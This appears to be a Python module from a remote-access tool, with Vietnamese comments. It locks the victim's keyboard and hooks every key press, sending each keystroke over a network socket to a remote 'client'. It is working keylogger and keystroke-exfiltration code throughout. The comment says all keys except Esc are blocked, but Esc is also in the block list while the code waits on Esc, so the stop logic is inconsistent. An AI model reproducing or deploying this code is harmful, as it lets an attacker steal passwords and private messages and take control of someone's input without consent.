import keyboard

def block_all_keys():
    # Danh sách các phím cần khóa
    normal_keys = [
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 
        'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 
        'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', 
        '4', '5', '6', '7', '8', '9', 'space', 'enter', 
        'tab', 'backspace', 'shift', 'ctrl', 'alt', 'esc', 
        'left', 'right', 'up', 'down'
    ]
    
    # Khóa tất cả các phím trong danh sách normal_keys
    for key in normal_keys:
        keyboard.block_key(key)
        
    print("Bàn phím đã bị khóa. Nhấn 'Esc' để tắt chế độ bắt phím.")

def unblock_all_keys():
    # Mở khóa tất cả các phím
    normal_keys = [
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 
        'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 
        'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', 
        '4', '5', '6', '7', '8', '9', 'space', 'enter', 
        'tab', 'backspace', 'shift', 'ctrl', 'alt', 'esc', 
        'left', 'right', 'up', 'down'
    ]

    for key in normal_keys:
        keyboard.unblock_key(key)
    print("Bàn phím đã được mở khóa.")

def start_keylogger(client_socket):
    def on_key_press(event):
        try:
            # Gửi phím nhấn tới client
            keystroke = event.name
            client_socket.send(keystroke.encode('utf-8'))
        except Exception as e:
            print(f"Lỗi khi gửi phím nhấn: {e}")

    # Khóa toàn bộ bàn phím ngoại trừ phím Esc
    block_all_keys()

    # Bắt đầu lắng nghe phím nhấn và gửi tới client
    print("Bắt đầu ghi nhận phím nhấn. Nhấn 'Esc' để dừng.")
    keyboard.hook(on_key_press)

    # Chờ phím 'Esc' để dừng bắt phím
    keyboard.wait('esc')
    print("Đã dừng ghi nhận phím nhấn.")
    unblock_all_keys()
